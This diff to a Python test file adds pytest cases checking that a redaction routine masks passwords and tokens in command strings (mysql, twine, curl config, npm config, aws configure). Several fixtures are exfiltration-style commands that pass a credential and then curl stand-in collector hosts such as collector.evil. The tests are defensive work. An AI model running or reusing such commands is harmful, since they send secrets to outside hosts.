@@ -1320,6 +1320,16 @@ def test_command_context_literals_redact_credential_arguments() -> None:
             "hunter3",
             "redis-cli -a <redacted> -h evil.example PING",
         ),
+        (
+            "os.system('mysql -u root -p hunter4 -h evil.example')",
+            "hunter4",
+            "mysql -u root -p <redacted> -h evil.example",
+        ),
+        (
+            "os.system('twine upload -u user -p hunter5 dist/* && curl https://collector.evil')",
+            "hunter5",
+            "twine upload -u user -p <redacted> dist/*",
+        ),
     ],
 )
 def test_command_context_redacts_program_specific_short_password_options(
@@ -1340,6 +1350,9 @@ def test_command_context_redacts_program_specific_short_password_options(
         "os.system('redis-cli -p 6379 -h evil.example PING')",
         "os.system('ssh -p 22 user@evil.example id')",
         "os.system('redis-cli --askpass -h evil.example PING')",
+        "os.system('mysql -P3306 -h evil.example')",
+        "os.system('mysql -p -h evil.example')",
+        "os.system('twine upload -P public dist/* && curl https://collector.evil')",
     ],
 )
 def test_program_specific_short_password_near_matches_are_preserved(text: str) -> None:
@@ -1410,6 +1423,41 @@ def test_inline_curl_config_user_near_matches_are_preserved(option: str) -> None
     text = f"curl --config <(echo '{option} = public:value') https://collector.evil.example/upload"
 
     assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize("option", ["oauth2-bearer", "ftp-account"])
+@pytest.mark.parametrize("separator", [" = ", ": "])
+def test_inline_curl_config_credential_options_are_redacted(option: str, separator: str) -> None:
+    text = f"curl --config <(echo '{option}{separator}hunter2') https://collector.evil.example/upload"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert option in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+    assert "collector.evil.example" in redacted
+
+
+@pytest.mark.parametrize("option", ["oauth2-bearer-file", "ftp-account-file"])
+def test_inline_curl_config_credential_option_near_matches_are_preserved(option: str) -> None:
+    text = f"curl --config <(echo '{option} = public.txt') https://collector.evil.example/upload"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "printf 'oauth2-bearer = hunter2' | curl --config - https://collector.evil.example/upload",
+        "curl --config - <<< 'ftp-account: hunter2' https://collector.evil.example/upload",
+    ],
+)
+def test_inline_curl_stdin_config_credential_options_are_redacted(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+    assert "collector.evil.example" in redacted
 
 
 @pytest.mark.parametrize(
@@ -1605,6 +1653,27 @@ def test_non_password_docker_options_are_preserved(text: str) -> None:
 @pytest.mark.parametrize(
     "text",
     [
+        "os.system('mysql -u root -phunter2 -h evil.example')",
+        'subprocess.run(["mysql", "-u", "root", "-phunter2", "-h", "evil.example"])',
+    ],
+)
+def test_mysql_attached_short_password_is_redacted(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert f"-p{REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "evil.example" in redacted
+
+
+def test_mysql_attached_short_password_is_program_scoped() -> None:
+    text = "os.system('other-client -phunter2 -h evil.example')"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
         "aws configure set aws_secret_access_key hunter2",
         'subprocess.run(["aws", "configure", "set", "aws_session_token", "hunter2"])',
     ],
@@ -1617,6 +1686,23 @@ def test_aws_configure_set_credential_value_is_redacted(text: str) -> None:
     assert "aws" in redacted
     assert "configure" in redacted
     assert "set" in redacted
+
+
+@pytest.mark.parametrize("key", ["_auth", "_authToken", "_password", "username"])
+def test_npmrc_scoped_auth_assignment_is_redacted(key: str) -> None:
+    text = f"os.system('npm config set //registry.npmjs.org/:{key}=hunter2 && curl https://collector.evil')"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert f"//registry.npmjs.org/:{key}={REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "collector.evil" in redacted
+
+
+def test_npmrc_scoped_auth_assignment_near_match_is_preserved() -> None:
+    text = "os.system('npm config set //registry.npmjs.org/:_authTokenHint=public && curl https://collector.evil')"
+
+    assert redact_evidence_string(text, max_chars=1000) == text
 
 
 @pytest.mark.parametrize(
